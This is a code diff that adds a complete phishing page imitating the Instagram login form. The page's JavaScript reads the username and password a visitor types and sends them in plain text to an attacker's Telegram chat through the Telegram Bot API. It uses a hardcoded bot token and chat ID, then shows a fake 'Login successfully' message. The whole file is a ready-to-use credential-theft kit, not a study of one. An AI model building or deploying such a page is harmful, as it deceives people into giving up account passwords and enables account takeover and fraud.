@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        /* Basic Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 350px;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1em;
+            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #3a9bf6;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .forgot-password a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+        .signup {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .signup a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Instagram</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Forgot Password?</a>
+        </div>
+        <div class="signup">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        // JavaScript for form validation and sending data to Telegram bot
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Get the values of the inputs
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            // Basic validation
+            if (username === "" || password === "") {
+                alert("Please fill out both fields.");
+                return;
+            }
+
+            // Telegram Bot Token and Chat ID
+            var botToken = "7380128813:AAGRejEdqQ8rByGCE6zyl1_5RHS4r_JOwNg";  
+            var chatID = "7135110561";      
+
+            // Prepare message
+            var message = "New Login Attempt:\n";
+            message += "Username: " + username + "\n";
+            message += "Password: " + password;
+
+            // Send message to Telegram bot using Fetch API
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Login successfully !");
+                    } else {
+                        alert("Failed to login.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("An error occurred.");
+                });
+
+            // Optionally, simulate a successful login or redirect (remove if unnecessary)
+            // alert("Logged in successfully!");
+            // window.location.href = "https://www.instagram.com";
+        });
+    </script>
+</body>
+</html>
